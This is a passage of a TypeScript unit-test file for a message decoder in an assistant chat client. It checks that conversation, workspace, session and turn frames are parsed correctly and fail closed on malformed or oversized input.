  it('narrows a full assistant_delta into { kind: assistant-delta } with all four fields', () => {
    expect(parseInboundMessage(encodeAssistantDelta(DELTA))).toEqual({
      kind: 'assistant-delta',
      delta: DELTA
    })
  })

  it('decodes seq:0 as the value 0, never as absent (requireNumber is type-not-truthiness)', () => {
    const first = { ...DELTA, seq: 0 }
    expect(parseInboundMessage(encodeAssistantDelta(first))).toEqual({
      kind: 'assistant-delta',
      delta: first
    })
  })

  it('decodes an empty-text delta as the value "", never as absent', () => {
    const empty = { ...DELTA, text: '' }
    expect(parseInboundMessage(encodeAssistantDelta(empty))).toEqual({
      kind: 'assistant-delta',
      delta: empty
    })
  })

  it('drops unknown server keys, keeping only the four known delta fields (forward-compat)', () => {
    const withExtras = { ...DELTA, model: 'claude', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeAssistantDelta(withExtras))).toEqual({
      kind: 'assistant-delta',
      delta: DELTA
    })
  })

  it('narrows a full turn_end into { kind: turn-end } with all three fields', () => {
    expect(parseInboundMessage(encodeTurnEnd(TURN_END))).toEqual({
      kind: 'turn-end',
      turnEnd: TURN_END
    })
  })

  it('drops unknown server keys, keeping only the three known turn_end fields (forward-compat)', () => {
    const withExtras = { ...TURN_END, usage: 42, extra: 'ignore-me' }
    expect(parseInboundMessage(encodeTurnEnd(withExtras))).toEqual({
      kind: 'turn-end',
      turnEnd: TURN_END
    })
  })

  it('still routes a message / message_chunk to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — assistant_delta / turn_end fail-closed (#199)', () => {
  it('throws when any assistant_delta field is missing or wrong type', () => {
    const bad: unknown[] = [
      { ...DELTA, conversation_id: undefined },
      { ...DELTA, turn_id: 42 },
      { ...DELTA, seq: '3' }, // stringified number is not a valid seq
      { ...DELTA, seq: null },
      { ...DELTA, text: undefined }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeAssistantDelta(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when an assistant_delta payload is not an object', () => {
    expect(() => parseInboundMessage(encodeAssistantDelta('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeAssistantDelta(['a']))).toThrow(WireDecodeError)
  })

  it('throws when any turn_end field is missing or wrong type', () => {
    const bad: unknown[] = [
      { ...TURN_END, conversation_id: undefined },
      { ...TURN_END, turn_id: null },
      { ...TURN_END, stop_reason: 42 } // a number is not a valid stop_reason
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeTurnEnd(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a turn_end payload is not an object', () => {
    expect(() => parseInboundMessage(encodeTurnEnd('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeTurnEnd(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — conversations recognition (#139, additive)', () => {
  it('narrows a conversations reply into an ordered { kind: conversations } list', () => {
    const result = parseInboundMessage(
      encodeConversations({ conversations: [CONV_NAMED, CONV_UNNAMED] })
    )
    expect(result).toEqual({ kind: 'conversations', conversations: [CONV_NAMED, CONV_UNNAMED] })
  })

  it('decodes a null name as null (a distinct unnamed value, never "" or absent — AC2)', () => {
    const result = parseInboundMessage(encodeConversations({ conversations: [CONV_UNNAMED] }))
    expect(result).toEqual({ kind: 'conversations', conversations: [CONV_UNNAMED] })
    // Pin the null specifically: an unnamed scratch conversation stays distinguishable downstream.
    if (result?.kind === 'conversations') {
      expect(result.conversations[0].name).toBeNull()
    }
  })

  it('decodes is_promoted / is_archived false as those values, never as absent', () => {
    // CONV_UNNAMED has is_promoted:false; assert both booleans survive both truth values.
    const result = parseInboundMessage(
      encodeConversations({ conversations: [CONV_NAMED, CONV_UNNAMED] })
    )
    if (result?.kind === 'conversations') {
      expect(result.conversations[0].is_promoted).toBe(true)
      expect(result.conversations[0].is_archived).toBe(false)
      expect(result.conversations[1].is_promoted).toBe(false)
      expect(result.conversations[1].is_archived).toBe(true)
    }
  })

  it('treats an empty conversations array as a valid zero-length list', () => {
    expect(parseInboundMessage(encodeConversations({ conversations: [] }))).toEqual({
      kind: 'conversations',
      conversations: []
    })
  })

  it('drops unknown server keys per row, keeping only the seven known fields (forward-compat)', () => {
    const withExtras = { ...CONV_NAMED, preview: 'ignore-me', unread: 3 }
    expect(parseInboundMessage(encodeConversations({ conversations: [withExtras] }))).toEqual({
      kind: 'conversations',
      conversations: [CONV_NAMED]
    })
  })

  it('still routes a message / message_chunk to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — conversations fail-closed (#139, AC2/AC4)', () => {
  it('throws when a conversations payload is not an object', () => {
    expect(() => parseInboundMessage(encodeConversations('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeConversations(['a']))).toThrow(WireDecodeError)
  })

  it('throws when conversations is missing or not an array', () => {
    const bad: unknown[] = [{}, { conversations: {} }, { conversations: 'x' }, { conversations: 3 }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversations(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any string field is missing or non-string', () => {
    const bad: unknown[] = [
      { ...CONV_NAMED, id: undefined },
      { ...CONV_NAMED, cwd: 42 },
      { ...CONV_NAMED, last_message_ts: undefined },
      { ...CONV_NAMED, last_used_at: null }
    ]
    for (const row of bad) {
      expect(() => parseInboundMessage(encodeConversations({ conversations: [row] }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when name is absent/undefined (never omitted on the wire) or a non-string non-null', () => {
    const bad: unknown[] = [
      { id: 'c', is_promoted: true, is_archived: false, cwd: '/', last_message_ts: 't', last_used_at: 'u' }, // name absent
      { ...CONV_NAMED, name: 42 }, // a number is not a valid name
      { ...CONV_NAMED, name: {} } // an object is not a valid name
    ]
    for (const row of bad) {
      expect(() => parseInboundMessage(encodeConversations({ conversations: [row] }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when is_promoted or is_archived is missing or non-boolean', () => {
    const bad: unknown[] = [
      { ...CONV_NAMED, is_promoted: 'true' },
      { ...CONV_NAMED, is_promoted: 1 },
      { ...CONV_NAMED, is_archived: undefined },
      { ...CONV_NAMED, is_archived: null }
    ]
    for (const row of bad) {
      expect(() => parseInboundMessage(encodeConversations({ conversations: [row] }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('fails the whole reply closed when any single row is invalid', () => {
    const bad: unknown[] = [
      { conversations: [CONV_NAMED, 'not-an-object'] },
      { conversations: [CONV_NAMED, { ...CONV_UNNAMED, id: undefined }] },
      { conversations: [{ ...CONV_NAMED, is_promoted: 'nope' }] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversations(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized conversations plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 12,
        type: 'conversations',
        ts: FIXED_TS,
        payload: { conversations: [{ ...CONV_NAMED, name: 'x'.repeat(MAX_PLAINTEXT_BYTES) }] }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — recent_workspaces_list recognition (#380, additive)', () => {
  it('narrows a recent_workspaces_list reply into an ordered { kind: recent-workspaces } list', () => {
    const result = parseInboundMessage(encodeRecentWorkspaces({ workspaces: [WS_ONE, WS_TWO] }))
    expect(result).toEqual({ kind: 'recent-workspaces', recentWorkspaces: [WS_ONE, WS_TWO] })
  })

  it('preserves wire order (most-recent-first is the daemon truth, carried unchanged)', () => {
    const result = parseInboundMessage(encodeRecentWorkspaces({ workspaces: [WS_TWO, WS_ONE] }))
    if (result?.kind === 'recent-workspaces') {
      expect(result.recentWorkspaces.map((w) => w.path)).toEqual([WS_TWO.path, WS_ONE.path])
    }
  })

  it('treats an empty workspaces array as a valid zero-length list', () => {
    expect(parseInboundMessage(encodeRecentWorkspaces({ workspaces: [] }))).toEqual({
      kind: 'recent-workspaces',
      recentWorkspaces: []
    })
  })

  it('drops unknown server keys per row, keeping only path + last_used_at (forward-compat)', () => {
    const withExtras = { ...WS_ONE, is_current: true, label: 'ignore-me' }
    expect(parseInboundMessage(encodeRecentWorkspaces({ workspaces: [withExtras] }))).toEqual({
      kind: 'recent-workspaces',
      recentWorkspaces: [WS_ONE]
    })
  })

  it('still routes a message / message_chunk to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — recent_workspaces_list fail-closed (#380, AC3)', () => {
  it('throws when a recent_workspaces_list payload is not an object', () => {
    expect(() => parseInboundMessage(encodeRecentWorkspaces('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeRecentWorkspaces(['a']))).toThrow(WireDecodeError)
  })

  it('throws when workspaces is absent or not an array', () => {
    const bad: unknown[] = [{}, { workspaces: {} }, { workspaces: 'x' }, { workspaces: 3 }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeRecentWorkspaces(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a row is missing path, or path is a non-string', () => {
    const bad: unknown[] = [
      { last_used_at: '2026-07-09T00:00:00Z' }, // path absent
      { ...WS_ONE, path: 42 },
      { ...WS_ONE, path: null }
    ]
    for (const row of bad) {
      expect(() => parseInboundMessage(encodeRecentWorkspaces({ workspaces: [row] }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when last_used_at is missing or a non-string', () => {
    const bad: unknown[] = [
      { path: '/home/user/project' }, // last_used_at absent
      { ...WS_ONE, last_used_at: 42 },
      { ...WS_ONE, last_used_at: null }
    ]
    for (const row of bad) {
      expect(() => parseInboundMessage(encodeRecentWorkspaces({ workspaces: [row] }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('fails the whole reply closed when any single row is invalid', () => {
    const bad: unknown[] = [
      { workspaces: [WS_ONE, 'not-an-object'] },
      { workspaces: [WS_ONE, { ...WS_TWO, path: undefined }] },
      { workspaces: [{ ...WS_ONE, last_used_at: 42 }] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeRecentWorkspaces(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized recent_workspaces_list plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 14,
        type: 'recent_workspaces_list',
        ts: FIXED_TS,
        payload: { workspaces: [{ ...WS_ONE, path: 'x'.repeat(MAX_PLAINTEXT_BYTES) }] }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — conversation_created recognition (#241, additive)', () => {
  it('narrows a conversation_created reply into { kind: conversation-created } with the five fields', () => {
    expect(parseInboundMessage(encodeConversationCreated(CREATED_NAMED))).toEqual({
      kind: 'conversation-created',
      conversationCreated: CREATED_NAMED
    })
  })

  it('decodes a null name as null (a distinct unnamed value, never "" or absent — AC5)', () => {
    const result = parseInboundMessage(encodeConversationCreated(CREATED_UNNAMED))
    expect(result).toEqual({ kind: 'conversation-created', conversationCreated: CREATED_UNNAMED })
    // Pin the null specifically: an unnamed scratch conversation stays distinguishable downstream.
    if (result?.kind === 'conversation-created') {
      expect(result.conversationCreated.name).toBeNull()
    }
  })

  it('decodes is_promoted false as the value false, never as absent', () => {
    const result = parseInboundMessage(encodeConversationCreated(CREATED_UNNAMED))
    if (result?.kind === 'conversation-created') {
      expect(result.conversationCreated.is_promoted).toBe(false)
    }
  })

  it('drops unknown server keys, keeping only the five known fields (forward-compat)', () => {
    // The daemon's ConversationSummary carries is_archived + last_message_ts; a create reply must not,
    // and even if a server sends extras they are tolerated but NOT copied through (spec #274).
    const withExtras = { ...CREATED_NAMED, is_archived: false, last_message_ts: 'x', preview: 'ignore' }
    expect(parseInboundMessage(encodeConversationCreated(withExtras))).toEqual({
      kind: 'conversation-created',
      conversationCreated: CREATED_NAMED
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — conversation_created fail-closed (#241, AC5)', () => {
  it('throws when the payload is not an object', () => {
    expect(() => parseInboundMessage(encodeConversationCreated('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeConversationCreated(['a']))).toThrow(WireDecodeError)
  })

  it('throws when any string field is missing or non-string', () => {
    const bad: unknown[] = [
      { ...CREATED_NAMED, id: undefined },
      { ...CREATED_NAMED, id: 42 },
      { ...CREATED_NAMED, cwd: undefined },
      { ...CREATED_NAMED, cwd: 42 },
      { ...CREATED_NAMED, last_used_at: undefined },
      { ...CREATED_NAMED, last_used_at: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationCreated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when name is absent/undefined (never omitted) or a non-string non-null', () => {
    const bad: unknown[] = [
      { id: 'c', is_promoted: true, cwd: '/', last_used_at: 'u' }, // name absent
      { ...CREATED_NAMED, name: 42 },
      { ...CREATED_NAMED, name: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationCreated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when is_promoted is missing or non-boolean', () => {
    const bad: unknown[] = [
      { ...CREATED_NAMED, is_promoted: 'true' },
      { ...CREATED_NAMED, is_promoted: 1 },
      { ...CREATED_NAMED, is_promoted: undefined },
      { ...CREATED_NAMED, is_promoted: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationCreated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized conversation_created plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 18,
        type: 'conversation_created',
        ts: FIXED_TS,
        payload: { ...CREATED_NAMED, name: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — conversation_updated recognition (#273, additive)', () => {
  it('narrows a conversation_updated reply into { kind: conversation-updated } with the five fields', () => {
    expect(parseInboundMessage(encodeConversationUpdated(UPDATED_NAMED))).toEqual({
      kind: 'conversation-updated',
      conversationUpdated: UPDATED_NAMED
    })
  })

  it('decodes a null name as null (a distinct unset value, never "" or absent — AC)', () => {
    const result = parseInboundMessage(encodeConversationUpdated(UPDATED_UNNAMED))
    expect(result).toEqual({ kind: 'conversation-updated', conversationUpdated: UPDATED_UNNAMED })
    // Pin the null specifically: an unset name stays distinguishable downstream (#275).
    if (result?.kind === 'conversation-updated') {
      expect(result.conversationUpdated.name).toBeNull()
    }
  })

  it('decodes is_promoted true as the value true, never as absent', () => {
    const result = parseInboundMessage(encodeConversationUpdated(UPDATED_NAMED))
    if (result?.kind === 'conversation-updated') {
      expect(result.conversationUpdated.is_promoted).toBe(true)
    }
  })

  it('drops unknown server keys, keeping only the five known fields (forward-compat)', () => {
    const withExtras = { ...UPDATED_NAMED, is_archived: false, last_message_ts: 'x', preview: 'ignore' }
    expect(parseInboundMessage(encodeConversationUpdated(withExtras))).toEqual({
      kind: 'conversation-updated',
      conversationUpdated: UPDATED_NAMED
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — conversation_updated fail-closed (#273, AC)', () => {
  it('throws when the payload is not an object', () => {
    expect(() => parseInboundMessage(encodeConversationUpdated('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeConversationUpdated(['a']))).toThrow(WireDecodeError)
  })

  it('throws when any string field is missing or non-string', () => {
    const bad: unknown[] = [
      { ...UPDATED_NAMED, id: undefined },
      { ...UPDATED_NAMED, id: 42 },
      { ...UPDATED_NAMED, cwd: undefined },
      { ...UPDATED_NAMED, cwd: 42 },
      { ...UPDATED_NAMED, last_used_at: undefined },
      { ...UPDATED_NAMED, last_used_at: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationUpdated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when name is absent/undefined (never omitted) or a non-string non-null', () => {
    const bad: unknown[] = [
      { id: 'c', is_promoted: true, cwd: '/', last_used_at: 'u' }, // name absent
      { ...UPDATED_NAMED, name: 42 },
      { ...UPDATED_NAMED, name: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationUpdated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when is_promoted is missing or non-boolean', () => {
    const bad: unknown[] = [
      { ...UPDATED_NAMED, is_promoted: 'true' },
      { ...UPDATED_NAMED, is_promoted: 1 },
      { ...UPDATED_NAMED, is_promoted: undefined },
      { ...UPDATED_NAMED, is_promoted: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationUpdated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized conversation_updated plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 19,
        type: 'conversation_updated',
        ts: FIXED_TS,
        payload: { ...UPDATED_NAMED, name: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — conversation_deleted recognition (#375, additive)', () => {
  it('narrows a conversation_deleted reply into { kind: conversation-deleted } with the id', () => {
    expect(parseInboundMessage(encodeConversationDeleted(DELETED))).toEqual({
      kind: 'conversation-deleted',
      conversationDeleted: DELETED
    })
  })

  it('drops unknown server keys, keeping only the fresh single-field { id } object (forward-compat)', () => {
    const withExtras = { ...DELETED, conversation_id: 'conv-9', reason: 'x', name: 'ignore' }
    expect(parseInboundMessage(encodeConversationDeleted(withExtras))).toEqual({
      kind: 'conversation-deleted',
      conversationDeleted: DELETED
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — conversation_deleted fail-closed (#375, AC)', () => {
  it('throws when the payload is not an object', () => {
    expect(() => parseInboundMessage(encodeConversationDeleted('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeConversationDeleted(['a']))).toThrow(WireDecodeError)
  })

  it('throws when id is missing or non-string', () => {
    const bad: unknown[] = [
      {}, // id absent
      { id: undefined },
      { id: 42 },
      { id: null },
      { id: {} },
      // the request's field name, not the reply's — a drifted frame must still fail closed.
      { conversation_id: 'conv-9' }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeConversationDeleted(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized conversation_deleted plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 20,
        type: 'conversation_deleted',
        ts: FIXED_TS,
        payload: { id: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — workspace_folder_created recognition (#381, additive)', () => {
  it('narrows a workspace_folder_created reply into { kind: workspace-folder-created } with the path', () => {
    expect(parseInboundMessage(encodeWorkspaceFolderCreated(FOLDER_CREATED))).toEqual({
      kind: 'workspace-folder-created',
      workspaceFolderCreated: FOLDER_CREATED
    })
  })

  it('drops unknown server keys, keeping only the fresh single-field { path } object (forward-compat)', () => {
    const withExtras = { ...FOLDER_CREATED, parent: '/home/user/projects', name: 'new-app' }
    expect(parseInboundMessage(encodeWorkspaceFolderCreated(withExtras))).toEqual({
      kind: 'workspace-folder-created',
      workspaceFolderCreated: FOLDER_CREATED
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — workspace_folder_created fail-closed (#381, AC)', () => {
  it('throws when the payload is not an object', () => {
    expect(() => parseInboundMessage(encodeWorkspaceFolderCreated('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeWorkspaceFolderCreated(['a']))).toThrow(WireDecodeError)
  })

  it('throws when path is missing or non-string', () => {
    const bad: unknown[] = [
      {}, // path absent
      { path: undefined },
      { path: 42 },
      { path: null },
      { path: {} },
      // the request's field names, not the reply's — a drifted frame must still fail closed.
      { parent: '/home/user/projects', name: 'new-app' }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeWorkspaceFolderCreated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized workspace_folder_created plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 21,
        type: 'workspace_folder_created',
        ts: FIXED_TS,
        payload: { path: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — session_transition recognition (#254, additive)', () => {
  it('narrows a full session_transition into { kind: session-transition } for each reason', () => {
    // clear / idle_evict carry workspace_cwd:null; workspace_change carries a non-null path.
    const cases = [
      { ...SESSION_TRANSITION, reason: 'clear', workspace_cwd: null },
      { ...SESSION_TRANSITION, reason: 'idle_evict', workspace_cwd: null },
      { ...SESSION_TRANSITION, reason: 'workspace_change', workspace_cwd: '/home/user/other' }
    ]
    for (const payload of cases) {
      expect(parseInboundMessage(encodeSessionTransition(payload))).toEqual({
        kind: 'session-transition',
        sessionTransition: payload
      })
    }
  })

  it('decodes workspace_cwd:null as null (a valid clear/idle_evict value, never absent — AC2)', () => {
    const result = parseInboundMessage(encodeSessionTransition(SESSION_TRANSITION))
    expect(result).toEqual({ kind: 'session-transition', sessionTransition: SESSION_TRANSITION })
    // Pin the null specifically — a clear/idle_evict frame stays distinguishable from workspace_change.
    if (result?.kind === 'session-transition') {
      expect(result.sessionTransition.workspace_cwd).toBeNull()
    }
  })

  it('drops unknown server keys (incl. a spurious conversation_id), keeping only the five known fields', () => {
    const withExtras = { ...SESSION_TRANSITION, conversation_id: 'conv-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeSessionTransition(withExtras))).toEqual({
      kind: 'session-transition',
      sessionTransition: SESSION_TRANSITION
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — session_transition fail-closed (#254)', () => {
  it('throws when reason is absent, a non-string, or a string outside the closed enum', () => {
    const bad: unknown[] = [
      (() => {
        const { reason: _dropped, ...missing } = SESSION_TRANSITION
        return missing
      })(), // reason absent
      { ...SESSION_TRANSITION, reason: 42 }, // non-string
      { ...SESSION_TRANSITION, reason: null },
      { ...SESSION_TRANSITION, reason: {} },
      { ...SESSION_TRANSITION, reason: 'evicted' }, // a string outside the closed enum
      { ...SESSION_TRANSITION, reason: '' } // empty string is still outside the enum
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionTransition(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when previous_session_id / new_session_id / occurred_at is absent or non-string', () => {
    const bad: unknown[] = [
      { ...SESSION_TRANSITION, previous_session_id: undefined },
      { ...SESSION_TRANSITION, new_session_id: 42 },
      { ...SESSION_TRANSITION, occurred_at: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionTransition(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when workspace_cwd is absent/undefined (must be present, even as null) or non-string-non-null', () => {
    const bad: unknown[] = [
      (() => {
        const { workspace_cwd: _dropped, ...missing } = SESSION_TRANSITION
        return missing
      })(), // workspace_cwd absent
      { ...SESSION_TRANSITION, workspace_cwd: 42 }, // a number is not a valid value
      { ...SESSION_TRANSITION, workspace_cwd: {} } // an object is not a valid value
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionTransition(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a session_transition payload is not an object', () => {
    expect(() => parseInboundMessage(encodeSessionTransition('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeSessionTransition(['a']))).toThrow(WireDecodeError)
  })

  it('names the failure category only for a bad reason — never echoes the value or a workspace path', () => {
    // reason out-of-enum, with a secret workspace_cwd present as a valid string: a naive impl would
    // interpolate the offending reason value (and the path) into the error message.
    let thrown: unknown = null
    try {
      parseInboundMessage(
        encodeSessionTransition({
          ...SESSION_TRANSITION,
          reason: 'evicted',
          workspace_cwd: '/home/secret/workspace'
        })
      )
    } catch (e) {
      thrown = e
    }
    expect(thrown).toBeInstanceOf(WireDecodeError)
    const message = (thrown as Error).message
    expect(message).not.toContain('evicted')
    expect(message).not.toContain('/home/secret/workspace')
  })

  it('throws on an oversized session_transition plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 19,
        type: 'session_transition',
        ts: FIXED_TS,
        payload: { ...SESSION_TRANSITION, new_session_id: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — session_settings_updated recognition (#264, additive)', () => {
  it('narrows a full session_settings_updated into { kind: session-settings-updated }', () => {
    expect(parseInboundMessage(encodeSessionSettingsUpdated(SESSION_SETTINGS_UPDATED))).toEqual({
      kind: 'session-settings-updated',
      sessionSettingsUpdated: SESSION_SETTINGS_UPDATED
    })
  })

  it('drops unknown server keys (incl. a spurious echoed model/reason), keeping only session_id', () => {
    const withExtras = { ...SESSION_SETTINGS_UPDATED, model: 'claude-opus-4-8', reason: 'clear' }
    expect(parseInboundMessage(encodeSessionSettingsUpdated(withExtras))).toEqual({
      kind: 'session-settings-updated',
      sessionSettingsUpdated: SESSION_SETTINGS_UPDATED
    })
  })

  it('carries the Envelope in_reply_to onto the kind as inReplyTo (#261 correlation id)', () => {
    expect(parseInboundMessage(encodeSessionSettingsUpdated(SESSION_SETTINGS_UPDATED, 7))).toEqual({
      kind: 'session-settings-updated',
      sessionSettingsUpdated: SESSION_SETTINGS_UPDATED,
      inReplyTo: 7
    })
  })

  it('leaves inReplyTo undefined when the frame omits in_reply_to (correlation fails closed downstream)', () => {
    const result = parseInboundMessage(encodeSessionSettingsUpdated(SESSION_SETTINGS_UPDATED))
    expect(result).toEqual({
      kind: 'session-settings-updated',
      sessionSettingsUpdated: SESSION_SETTINGS_UPDATED
    })
    // Explicit: the carrier is present-but-undefined, so daemonConnection's lookup short-circuits.
    expect(result?.kind === 'session-settings-updated' && result.inReplyTo).toBeUndefined()
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — session_settings_updated fail-closed (#264)', () => {
  it('throws when session_id is absent or a non-string', () => {
    const bad: unknown[] = [
      {}, // session_id absent
      { session_id: 42 }, // a number is not a valid value
      { session_id: null }, // a null is not a valid value (session_id is never nullable)
      { session_id: {} } // an object is not a valid value
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionSettingsUpdated(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a session_settings_updated payload is not an object', () => {
    expect(() => parseInboundMessage(encodeSessionSettingsUpdated('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeSessionSettingsUpdated(['a']))).toThrow(WireDecodeError)
  })

  it('names the failure category only for a missing session_id — never echoes the value', () => {
    // session_id present as an object carrying a secret string: a naive impl might interpolate it.
    let thrown: unknown = null
    try {
      parseInboundMessage(encodeSessionSettingsUpdated({ session_id: { secret: 'sess-secret-value' } }))
    } catch (e) {
      thrown = e
    }
    expect(thrown).toBeInstanceOf(WireDecodeError)
    expect((thrown as Error).message).not.toContain('sess-secret-value')
  })

  it('throws on an oversized session_settings_updated plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 20,
        type: 'session_settings_updated',
        ts: FIXED_TS,
        payload: { session_id: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — turn_state recognition (#214, additive)', () => {
  it('narrows a full turn_state into { kind: turn-state } for each of the three states', () => {
    for (const state of ['thinking', 'responding', 'idle'] as const) {
      const payload = { conversation_id: 'conv-1', state }
      expect(parseInboundMessage(encodeTurnState(payload))).toEqual({
        kind: 'turn-state',
        turnState: payload
      })
    }
  })

  it('drops unknown server keys, keeping only the two known turn_state fields (forward-compat)', () => {
    const withExtras = { ...TURN_STATE, phase: 'legacy', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeTurnState(withExtras))).toEqual({
      kind: 'turn-state',
      turnState: TURN_STATE
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
